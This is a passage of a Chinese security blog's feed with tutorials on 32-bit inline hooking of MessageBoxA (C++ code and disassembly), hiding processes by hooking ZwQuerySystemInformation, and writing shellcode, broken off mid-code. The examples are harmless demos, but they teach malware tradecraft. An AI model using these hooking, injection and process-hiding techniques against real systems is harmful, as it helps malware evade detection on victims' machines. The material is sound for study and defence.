title="如何实现"></a>如何实现</h4><p>通过上面我们知道了，我们需要修改的就是程序的执行流程，而改变程序的执行流程就是jmp、call等，我们用最常见的jmp来进行分析。</p><p>如图可以看到一条JMP指令，看到后面的地址是0x401254，再看旁边的机器码是E9 EF000000。我们知道E9是JMP的机器码，那么EF000000为什么和要跳转的地址不一样呢。这是因为在JMP后面使用的是一个偏移量而不是一个具体的地址。如果使用地址的话，数据重定位之后，每次都会变，但是使用偏移就不一样了。</p><figure class="highlight basic"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs basic"><span class="hljs-symbol">00401160 </span>  . /E9 EF000000        jmp InlineHo.<span class="hljs-number">00401254</span><br></code></pre></div></td></tr></table></figure><p><img src="/2021/07/28/HOOK-Inline%20Hook/3.png"></p><p>JMP后的偏移计算公式是：</p><p>偏移=目的地址-原地址-5</p><p>5是JMP指令的长度，如果是其他的一些指令的话，那么这里不是5，可能是6、7所以要注意要根据具体情况而来。</p><p>想要用JMP进行修改，我们就需要构造机器码修改前五个字节。来尝试HOOK一下MessageBox函数。</p><h4 id="具体实现"><a href="#具体实现" class="headerlink" title="具体实现"></a>具体实现</h4><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;Windows.h&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-keyword">int</span> WINAPI <span class="hljs-title">My_MessageBoxA</span><span class="hljs-params">(</span></span><br><span class="hljs-params"><span class="hljs-function">    _In_opt_ HWND hWnd,</span></span><br><span class="hljs-params"><span class="hljs-function">    _In_opt_ LPCSTR lpText,</span></span><br><span class="hljs-params"><span class="hljs-function">    _In_opt_ LPCSTR lpCaption,</span></span><br><span class="hljs-params"><span class="hljs-function">    _In_ UINT uType)</span></span>;<br>FARPROC MessageBoxAAddress;<br>BYTE NewData[<span class="hljs-number">5</span>] = &#123; <span class="hljs-number">0xE9</span>, <span class="hljs-number">0x0</span>, <span class="hljs-number">0x0</span>, <span class="hljs-number">0x0</span>,<span class="hljs-number">0</span> &#125;;<br>BYTE OldData[<span class="hljs-number">5</span>] = &#123; <span class="hljs-number">0</span> &#125;;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">InlineHook</span><span class="hljs-params">()</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">UnInlineHook</span><span class="hljs-params">()</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>    <br>    <span class="hljs-built_in">MessageBoxA</span>(<span class="hljs-literal">NULL</span>, <span class="hljs-string">&quot;原始窗口1&quot;</span>, <span class="hljs-string">&quot;未被HOOK&quot;</span>, MB_OK);<br>    <span class="hljs-built_in">InlineHook</span>();<br>    <span class="hljs-built_in">MessageBoxA</span>(<span class="hljs-literal">NULL</span>, <span class="hljs-string">&quot;原始窗口2&quot;</span>, <span class="hljs-string">&quot;未被HOOK&quot;</span>, MB_OK);<br>    <span class="hljs-built_in">UnInlineHook</span>();<br>    <span class="hljs-built_in">MessageBoxA</span>(<span class="hljs-literal">NULL</span>, <span class="hljs-string">&quot;原始窗口3&quot;</span>, <span class="hljs-string">&quot;未被HOOK&quot;</span>, MB_OK);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">InlineHook</span><span class="hljs-params">()</span> </span>&#123;<br>    MessageBoxAAddress = <span class="hljs-built_in">GetProcAddress</span>(<span class="hljs-built_in">LoadLibraryA</span>(<span class="hljs-string">&quot;user32.dll&quot;</span>), <span class="hljs-string">&quot;MessageBoxA&quot;</span>);<br>    <span class="hljs-comment">//保存原数据</span><br>    <span class="hljs-built_in">memcpy</span>(OldData, MessageBoxAAddress, <span class="hljs-number">5</span>);<br>    <span class="hljs-comment">//计算需要跳转的偏移</span><br>    DWORD dwOffset = (DWORD)My_MessageBoxA - (DWORD)MessageBoxAAddress  - <span class="hljs-number">5</span>;<br>    <span class="hljs-comment">//写入新数据，跳转的偏移</span><br>    <span class="hljs-built_in">memcpy</span>(&amp;NewData[<span class="hljs-number">1</span>], &amp;dwOffset, <span class="hljs-number">5</span>);<br><br>    DWORD dwOldprotect = <span class="hljs-number">0</span>;<br>    <span class="hljs-comment">//修改页属性</span><br>    <span class="hljs-built_in">VirtualProtect</span>(MessageBoxAAddress, <span class="hljs-number">5</span>, PAGE_EXECUTE_READWRITE, &amp;dwOldprotect);<br>    <span class="hljs-comment">//写入五个字节</span><br>    <span class="hljs-built_in">memcpy</span>(MessageBoxAAddress, NewData, <span class="hljs-number">5</span>);<br>    <span class="hljs-comment">//恢复页属性</span><br>    <span class="hljs-built_in">VirtualProtect</span>(MessageBoxAAddress, <span class="hljs-number">5</span>, dwOldprotect, &amp;dwOldprotect);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">UnInlineHook</span><span class="hljs-params">()</span> </span>&#123;<br>    MessageBoxAAddress = <span class="hljs-built_in">GetProcAddress</span>(<span class="hljs-built_in">LoadLibraryA</span>(<span class="hljs-string">&quot;user32.dll&quot;</span>), <span class="hljs-string">&quot;MessageBoxA&quot;</span>);<br>    DWORD dwOldProtect = <span class="hljs-number">0</span>;<br>    <span class="hljs-built_in">VirtualProtect</span>(MessageBoxAAddress, <span class="hljs-number">5</span>, PAGE_EXECUTE_READWRITE, &amp;dwOldProtect);<br>    <span class="hljs-comment">//恢复原来的字节码</span><br>    <span class="hljs-built_in">memcpy</span>(MessageBoxAAddress, OldData, <span class="hljs-number">5</span>);<br>    <span class="hljs-built_in">VirtualProtect</span>(MessageBoxAAddress, <span class="hljs-number">5</span>, dwOldProtect, &amp;dwOldProtect);<br><br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> WINAPI <span class="hljs-title">My_MessageBoxA</span><span class="hljs-params">(</span></span><br><span class="hljs-params"><span class="hljs-function">    _In_opt_ HWND hWnd,</span></span><br><span class="hljs-params"><span class="hljs-function">    _In_opt_ LPCSTR lpText,</span></span><br><span class="hljs-params"><span class="hljs-function">    _In_opt_ LPCSTR lpCaption,</span></span><br><span class="hljs-params"><span class="hljs-function">    _In_ UINT uType)</span> </span>&#123;<br>    <span class="hljs-comment">//先恢复原来的字节码，然后调用正常的MessageboxA弹窗</span><br>    <span class="hljs-built_in">UnInlineHook</span>();<br>    <span class="hljs-keyword">int</span> bRet = <span class="hljs-built_in">MessageBoxA</span>(<span class="hljs-literal">NULL</span>, <span class="hljs-string">&quot;Inline Hook\ni am b1ackie!!!&quot;</span>, <span class="hljs-string">&quot;hook&quot;</span>, MB_OK);<br>    <span class="hljs-built_in">InlineHook</span>();<br>    <span class="hljs-keyword">return</span> bRet;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>可以看到有三个弹窗，正常流程下肯定是1,2,3但是我们Inline Hook了MessageBoxA函数，并且将其中内容改了，如果成功的话，第二个弹窗会不一样，运行程序查看效果。</p><p>先是第一个正常的窗口</p><p><img src="/2021/07/28/HOOK-Inline%20Hook/4.png"></p><p>然后是第二个窗口，开始了InlineHook，可以看到并没有弹出原始窗口2，说明此时已经被HOOK了</p><p><img src="/2021/07/28/HOOK-Inline%20Hook/5.png"></p><p>第三个窗口再取消InlineHook后弹出正常的窗口</p><p><img src="/2021/07/28/HOOK-Inline%20Hook/6.png"></p><p>现在使用OD载入程序来看一下，直接查看第二个MessageBoxA函数，进入查看可以看到函数头部已经改变了，变成了JMP。</p><p><img src="/2021/07/28/HOOK-Inline%20Hook/7.png"></p><p>跳过来看，就是我们自己编写的My_MessageBoxA函数</p><figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">00401170</span> &gt;/.  <span class="hljs-number">55</span>            push ebp<br><span class="hljs-attribute">00401171</span>  |.  <span class="hljs-number">8</span>BEC          mov ebp,esp<br><span class="hljs-attribute">00401173</span>  |.  <span class="hljs-number">83</span>EC <span class="hljs-number">08</span>       sub esp,<span class="hljs-number">0</span>x<span class="hljs-number">8</span><br><span class="hljs-attribute">00401176</span>  |.  A<span class="hljs-number">1</span> <span class="hljs-number">04304100</span>   mov eax,dword ptr ds:[__security_cookie_fai&gt;<br><span class="hljs-attribute">0040117B</span>  |.  <span class="hljs-number">33</span>C<span class="hljs-number">5</span>          xor eax,ebp<br><span class="hljs-attribute">0040117D</span>  |.  <span class="hljs-number">8945</span> FC       mov dword ptr ss:[ebp-<span class="hljs-number">0</span>x<span class="hljs-number">4</span>],eax<br><span class="hljs-attribute">00401180</span>  |.  <span class="hljs-number">56</span>            push esi<br><span class="hljs-attribute">00401181</span>  |.  <span class="hljs-number">68</span> <span class="hljs-number">4</span>C<span class="hljs-number">1</span>C<span class="hljs-number">4100</span>   push InlineHo.<span class="hljs-number">00411</span>C<span class="hljs-number">4</span>C                      ; /MessageBoxA<br><span class="hljs-attribute">00401186</span>  |.  <span class="hljs-number">68</span> <span class="hljs-number">581</span>C<span class="hljs-number">4100</span>   push InlineHo.<span class="hljs-number">00411</span>C<span class="hljs-number">58</span>                      ; |/user<span class="hljs-number">32</span>.dll<br><span class="hljs-attribute">0040118B</span>  |.  FF<span class="hljs-number">15</span> <span class="hljs-number">04</span>D<span class="hljs-number">04000</span> call dword ptr ds:[&lt;&amp;KERNEL<span class="hljs-number">32</span>.LoadLibraryA&gt;&gt;; |\LoadLibraryA<br><span class="hljs-attribute">00401191</span>  |.  <span class="hljs-number">50</span>            push eax                                    ; |hModule = <span class="hljs-number">00000001</span><br><span class="hljs-attribute">00401192</span>  |.  FF<span class="hljs-number">15</span> <span class="hljs-number">08</span>D<span class="hljs-number">04000</span> call dword ptr ds:[&lt;&amp;KERNEL<span class="hljs-number">32</span>.GetProcAddres&gt;; \GetProcAddress<br><span class="hljs-attribute">00401198</span>  |.  <span class="hljs-number">8</span>B<span class="hljs-number">35</span> <span class="hljs-number">00</span>D<span class="hljs-number">04000</span> mov esi,dword ptr ds:[&lt;&amp;KERNEL<span class="hljs-number">32</span>.VirtualPro&gt;;  kernel<span class="hljs-number">32</span>.VirtualProtect<br><span class="hljs-attribute">0040119E</span>  |.  <span class="hljs-number">8</span>D<span class="hljs-number">4</span>D F<span class="hljs-number">8</span>       lea ecx,dword ptr ss:[ebp-<span class="hljs-number">0</span>x<span class="hljs-number">8</span>]<br><span class="hljs-attribute">004011A1</span>  |.  <span class="hljs-number">51</span>            push ecx                                    ; /pOldProtect = <span class="hljs-number">049</span>BE<span class="hljs-number">914</span><br><span class="hljs-attribute">004011A2</span>  |.  <span class="hljs-number">6</span>A <span class="hljs-number">40</span>         push <span class="hljs-number">0</span>x<span class="hljs-number">40</span>                                   ; |NewProtect = PAGE_EXECUTE_READWRITE<br><span class="hljs-attribute">004011A4</span>  |.  <span class="hljs-number">6</span>A <span class="hljs-number">05</span>         push <span class="hljs-number">0</span>x<span class="hljs-number">5</span>                                    ; |Size = <span class="hljs-number">0</span>x<span class="hljs-number">5</span><br><span class="hljs-attribute">004011A6</span>  |.  <span class="hljs-number">50</span>            push eax                                    ; |Address = <span class="hljs-number">00000001</span><br><span class="hljs-attribute">004011A7</span>  |.  A<span class="hljs-number">3</span> A<span class="hljs-number">0424100</span>   mov dword ptr ds:[MessageBoxAAddressfailure&gt;; |<br><span class="hljs-attribute">004011AC</span>  |.  C<span class="hljs-number">745</span> F<span class="hljs-number">8</span> <span class="hljs-number">00000</span>&gt;mov dword ptr ss:[ebp-<span class="hljs-number">0</span>x<span class="hljs-number">8</span>],<span class="hljs-number">0</span>x<span class="hljs-number">0</span>              ; |<br><span class="hljs-attribute">004011B3</span>  |.  FFD<span class="hljs-number">6</span>          call esi                                    ; \VirtualProtect<br><span class="hljs-attribute">004011B5</span>  |.  <span class="hljs-number">8</span>B<span class="hljs-number">0</span>D A<span class="hljs-number">0424100</span> mov ecx,dword ptr ds:[MessageBoxAAddressfai&gt;;  user<span class="hljs-number">32</span>.MessageBoxA<br><span class="hljs-attribute">004011BB</span>  |.  A<span class="hljs-number">1</span> <span class="hljs-number">98424100</span>   mov eax,dword ptr ds:[OldDatan_table]<br><span class="hljs-attribute">004011C0</span>  |.  <span class="hljs-number">8901</span>          mov dword ptr ds:[ecx],eax<br><span class="hljs-attribute">004011C2</span>  |.  A<span class="hljs-number">0</span> <span class="hljs-number">9</span>C<span class="hljs-number">424100</span>   mov al,byte ptr ds:[<span class="hljs-number">0</span>x<span class="hljs-number">41429</span>C]<br><span class="hljs-attribute">004011C7</span>  |.  <span class="hljs-number">8841</span> <span class="hljs-number">04</span>       mov byte ptr ds:[ecx+<span class="hljs-number">0</span>x<span class="hljs-number">4</span>],al<br><span class="hljs-attribute">004011CA</span>  |.  <span class="hljs-number">8</span>D<span class="hljs-number">45</span> F<span class="hljs-number">8</span>       lea eax,dword ptr ss:[ebp-<span class="hljs-number">0</span>x<span class="hljs-number">8</span>]<br><span class="hljs-attribute">004011CD</span>  |.  <span class="hljs-number">50</span>            push eax                                    ; /pOldProtect = <span class="hljs-number">00000001</span><br><span class="hljs-attribute">004011CE</span>  |.  FF<span class="hljs-number">75</span> F<span class="hljs-number">8</span>       push dword ptr ss:[ebp-<span class="hljs-number">0</span>x<span class="hljs-number">8</span>]                 ; |NewProtect = PAGE_NOACCESS|PAGE_WRITECOPY|PAGE_EXECUTE|PAGE_EXECUTE_READWRITE|MEM_COMMIT|<span class="hljs-number">400400</span><br><span class="hljs-attribute">004011D1</span>  |.  <span class="hljs-number">6</span>A <span class="hljs-number">05</span>         push <span class="hljs-number">0</span>x<span class="hljs-number">5</span>                                    ; |Size = <span class="hljs-number">0</span>x<span class="hljs-number">5</span><br><span class="hljs-attribute">004011D3</span>  |.  <span class="hljs-number">51</span>            push ecx                                    ; |Address = <span class="hljs-number">049</span>BE<span class="hljs-number">914</span><br><span class="hljs-attribute">004011D4</span>  |.  FFD<span class="hljs-number">6</span>          call esi                                    ; \VirtualProtect<br><span class="hljs-attribute">004011D6</span>  |.  <span class="hljs-number">6</span>A <span class="hljs-number">00</span>         push <span class="hljs-number">0</span>x<span class="hljs-number">0</span>                                    ; /Style = MB_OK|MB_APPLMODAL<br><span class="hljs-attribute">004011D8</span>  |.  <span class="hljs-number">68</span> <span class="hljs-number">641</span>C<span class="hljs-number">4100</span>   push InlineHo.<span class="hljs-number">00411</span>C<span class="hljs-number">64</span>                      ; |hook<br><span class="hljs-attribute">004011DD</span>  |.  <span class="hljs-number">68</span> <span class="hljs-number">6</span>C<span class="hljs-number">1</span>C<span class="hljs-number">4100</span>   push InlineHo.<span class="hljs-number">00411</span>C<span class="hljs-number">6</span>C                      ; |Inline Hook\ni am b<span class="hljs-number">1</span>ackie!!!<br><span class="hljs-attribute">004011E2</span>  |.  <span class="hljs-number">6</span>A <span class="hljs-number">00</span>         push <span class="hljs-number">0</span>x<span class="hljs-number">0</span>                                    ; |hOwner = NULL<br><span class="hljs-attribute">004011E4</span>  |.  FF<span class="hljs-number">15</span> <span class="hljs-number">10</span>D<span class="hljs-number">14000</span> call dword ptr ds:[&lt;&amp;USER<span class="hljs-number">32</span>.MessageBoxA&gt;]   ; \MessageBoxA<br><span class="hljs-attribute">004011EA</span>  |.  <span class="hljs-number">8</span>BF<span class="hljs-number">0</span>          mov esi,eax<br><span class="hljs-attribute">004011EC</span>  |.  E<span class="hljs-number">8</span> CFFEFFFF   call InlineHo.InlineHook_ansi_nolocketaryso&gt;<br><span class="hljs-attribute">004011F1</span>  |.  <span class="hljs-number">8</span>B<span class="hljs-number">4</span>D FC       mov ecx,dword ptr ss:[ebp-<span class="hljs-number">0</span>x<span class="hljs-number">4</span>]<br><span class="hljs-attribute">004011F4</span>  |.  <span class="hljs-number">8</span>BC<span class="hljs-number">6</span>          mov eax,esi<br><span class="hljs-attribute">004011F6</span>  |.  <span class="hljs-number">33</span>CD          xor ecx,ebp<br><span class="hljs-attribute">004011F8</span>  |.  <span class="hljs-number">5</span>E            pop esi                                     ;  InlineHo.<span class="hljs-number">0040103</span>C<br><span class="hljs-attribute">004011F9</span>  |.  E<span class="hljs-number">8</span> <span class="hljs-number">06000000</span>   call InlineHo.__security_check_cookiepresen&gt;<br><span class="hljs-attribute">004011FE</span>  |.  <span class="hljs-number">8</span>BE<span class="hljs-number">5</span>          mov esp,ebp<br><span class="hljs-attribute">00401200</span>  |.  <span class="hljs-number">5</span>D            pop ebp                                     ;  InlineHo.<span class="hljs-number">0040103</span>C<br><span class="hljs-attribute">00401201</span>  \.  C<span class="hljs-number">2</span> <span class="hljs-number">1000</span>       retn <span class="hljs-number">0</span>x<span class="hljs-number">10</span><br></code></pre></div></td></tr></table></figure><h4 id="注入方式实现inline-hook"><a href="#注入方式实现inline-hook" class="headerlink" title="注入方式实现inline hook"></a>注入方式实现inline hook</h4><p>我们可以将inline hook写成一个dll文件，然后通过远线程注入的方式，将其注入到进程中。</p><p>远程线程的具体实现：<a href="https://b1ack1e.github.io/2021/07/12/%E6%B3%A8%E5%85%A5%E6%8A%80%E6%9C%AF-%E8%BF%9C%E7%A8%8B%E7%BA%BF%E7%A8%8B%E6%B3%A8%E5%85%A5/">注入技术-远程线程注入</a></p><p>编写一个弹窗，实现效果如下</p><p><img src="/2021/07/28/HOOK-Inline%20Hook/8.png"></p><p>当注入成功后，内容更改</p><p><img src="/2021/07/28/HOOK-Inline%20Hook/9.png"></p><h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>本篇只介绍了32位的Inline Hook，但是64位原理相同，只是修改的字节数不同，还有跳转方式也只介绍了基于JMP的，还有其他几种跳转方式，感兴趣可以看《加密与解密第四版》其中有较为详细的介绍。</p>]]></content>
    
    
    <categories>
      
      <category>HOOK技术</category>
      
    </categories>
    
    
    <tags>
      
      <tag>恶意代码</tag>
      
      <tag>黑客编程</tag>
      
      <tag>Inline Hook</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>隐藏技术-进程隐藏</title>
    <link href="/2021/07/27/%E9%9A%90%E8%97%8F%E6%8A%80%E6%9C%AF-%E8%BF%9B%E7%A8%8B%E9%9A%90%E8%97%8F/"/>
    <url>/2021/07/27/%E9%9A%90%E8%97%8F%E6%8A%80%E6%9C%AF-%E8%BF%9B%E7%A8%8B%E9%9A%90%E8%97%8F/</url>
    
    <content type="html"><![CDATA[<h4 id="进程隐藏"><a href="#进程隐藏" class="headerlink" title="进程隐藏"></a>进程隐藏</h4><p>在windows中，用户程序的所有操作都是基于WIN32API来实现的，例如使用任务管理器查看进程等操作，这就给了病毒木马操作的空间。它可以通过HOOK技术拦截API的调用，并对数据进行监控和修改，从而达到不可告人的目的。</p><p>实现进程隐藏可以HOOK ZwQuerySystemInformain来实现进程的隐藏。遍历进程通常是调用EnumProcesses或者CreateToolhelp32Snapshot等来实现。跟踪这些函数可以发现，他们内部都调用了ZwQuerySystemInformain函数。</p><p>可以用调试器跟踪一下CreateToolhelp32Snapshot函数，可以看到在内部调用了ZwQuerySystemInformain函数</p><p><img src="/2021/07/27/%E9%9A%90%E8%97%8F%E6%8A%80%E6%9C%AF-%E8%BF%9B%E7%A8%8B%E9%9A%90%E8%97%8F/1.png"></p><p>在ZwQuerySystemInformain函数的内部判断检索的信息是否是进程信息，若是，则对返回的进程信息进行修改，将隐藏的进程信息从中去掉再返回。</p><p>这需要用到Inline Hook，关于Inline Hook看这里</p><p><a href="https://b1ack1e.github.io/2021/07/28/HOOK-Inline%20Hook/">HOOK-Inline Hook</a></p><h4 id="函数介绍"><a href="#函数介绍" class="headerlink" title="函数介绍"></a>函数介绍</h4><p>ZwQuerySystemInformation</p><p>获取指定的系统信息</p><figure class="highlight sqf"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs sqf">NTSTATUS WINAPI ZwQuerySystemInformation(<br>  <span class="hljs-variable">_In_</span>      SYSTEM_INFORMATION_CLASS SystemInformationClass,<br>  <span class="hljs-variable">_Inout_</span>   PVOID                    SystemInformation,<br>  <span class="hljs-variable">_In_</span>      ULONG                    SystemInformationLength,<br>  <span class="hljs-variable">_Out_opt_</span> PULONG                   ReturnLength<br>);<br></code></pre></div></td></tr></table></figure><p>SystemInformationClass：要检索系统的信息类型。SystemProcessInformation(5)表示检索系统的进程信息。</p><p>SystemInformation：指向缓冲区的指针，用于接受请求的信息。该信息的大小和结构取决于SystemInformationClass的值。如检索信息是SystemProcessInformation那么缓冲区为SYSTEM_PROCESS_INFORMATION结构数组。</p><p>SystemInformationLength：SystemInformation指向缓冲区的大小。</p><p>ReturnLength：指向函数写入请求信息的实际大小的位置。</p><p>返回值：返回NTSTATUS成功或错误代码。</p>]]></content>
    
    
    <categories>
      
      <category>黑客编程</category>
      
    </categories>
    
    
    <tags>
      
      <tag>恶意代码</tag>
      
      <tag>黑客编程</tag>
      
      <tag>隐藏技术</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>shellcode学习</title>
    <link href="/2021/07/22/shellcode%E5%AD%A6%E4%B9%A0/"/>
    <url>/2021/07/22/shellcode%E5%AD%A6%E4%B9%A0/</url>
    
    <content type="html"><![CDATA[<h3 id="shellcode学习"><a href="#shellcode学习" class="headerlink" title="shellcode学习"></a>shellcode学习</h3><h4 id="编译器的一些设置"><a href="#编译器的一些设置" class="headerlink" title="编译器的一些设置"></a>编译器的一些设置</h4><h5 id="第一步修改入口点"><a href="#第一步修改入口点" class="headerlink" title="第一步修改入口点"></a>第一步修改入口点</h5><p>在编译器中修改程序的入口点，写代码时就可以使用新的入口点名</p><p><img src="/2021/07/22/shellcode%E5%AD%A6%E4%B9%A0/1.png"></p><p>修改过后，体积变得很小，使用IDA查看也可以看到左边函数只有两个。</p><p><img src="/2021/07/22/shellcode%E5%AD%A6%E4%B9%A0/2.png"></p><h5 id="第二步关闭缓冲区安全检查"><a href="#第二步关闭缓冲区安全检查" class="headerlink" title="第二步关闭缓冲区安全检查"></a>第二步关闭缓冲区安全检查</h5><p><img src="/2021/07/22/shellcode%E5%AD%A6%E4%B9%A0/3.png"></p><p>然后查看IDA，左边函数只剩一个了</p><p><img src="/2021/07/22/shellcode%E5%AD%A6%E4%B9%A0/4.png"></p><h5 id="第三步设置工程兼容XP"><a href="#第三步设置工程兼容XP" class="headerlink" title="第三步设置工程兼容XP"></a>第三步设置工程兼容XP</h5><p><img src="/2021/07/22/shellcode%E5%AD%A6%E4%B9%A0/5.png"></p><p>修改运行库为MT</p><p><img src="/2021/07/22/shellcode%E5%AD%A6%E4%B9%A0/6.png"></p><h5 id="第四步关闭生成清单"><a href="#第四步关闭生成清单" class="headerlink" title="第四步关闭生成清单"></a>第四步关闭生成清单</h5><p><img src="/2021/07/22/shellcode%E5%AD%A6%E4%B9%A0/7.png"></p><p>使用loadpe查看看到只有两个区段</p><p><img src="/2021/07/22/shellcode%E5%AD%A6%E4%B9%A0/8.png"></p><h5 id="第五步关闭调试信息"><a href="#第五步关闭调试信息" class="headerlink" title="第五步关闭调试信息"></a>第五步关闭调试信息</h5><p><img src="/2021/07/22/shellcode%E5%AD%A6%E4%B9%A0/9.png"></p><h4 id="shellcode编写原则1"><a href="#shellcode编写原则1" class="headerlink" title="shellcode编写原则1"></a>shellcode编写原则1</h4><ul><li>杜绝双引号字符串的直接使用</li><li>关闭VS自动优化没有使用到的变量</li><li>自定义函数入口</li></ul><p>#pragma comment(linker,”/entry:EntryMain”)</p><h4 id="shellcode编写原则2"><a href="#shellcode编写原则2" class="headerlink" title="shellcode编写原则2"></a>shellcode编写原则2</h4><p>动态获取函数地址</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;Windows.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker,<span class="hljs-meta-string">&quot;/entry:EntryMain&quot;</span>)</span><br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">EntryMain</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">typedef</span> <span class="hljs-title">int</span> <span class="hljs-params">(WINAPI* FN_MessageBoxA)</span><span class="hljs-params">(</span></span><br><span class="hljs-params"><span class="hljs-function">            __in_opt HWND hWnd,</span></span><br><span class="hljs-params"><span class="hljs-function">            __in_opt LPCSTR lpText,</span></span><br><span class="hljs-params"><span class="hljs-function">            __in_opt LPCSTR lpCaption,</span></span><br><span class="hljs-params"><span class="hljs-function">            __in UINT uType)</span></span>;<br>    FN_MessageBoxA fn_MessageBoxA;<br>    fn_MessageBoxA = (FN_MessageBoxA)GetProcAddress(LoadLibraryA(<span class="hljs-string">&quot;user32.dll&quot;</span>), <span class="hljs-string">&quot;MessageBoxA&quot;</span>);<br>    fn_MessageBoxA(<span class="hljs-literal">NULL</span>, <span class="hljs-string">&quot;b1ackie&quot;</span>, <span class="hljs-string">&quot;hhh&quot;</span>, <span class="hljs-literal">NULL</span>);<br><br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><h4 id="shellcode编写原则3"><a href="#shellcode编写原则3" class="headerlink" title="shellcode编写原则3"></a>shellcode编写原则3</h4><p>获取kernel32.dll基址和GetProcAddress地址获取。</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span 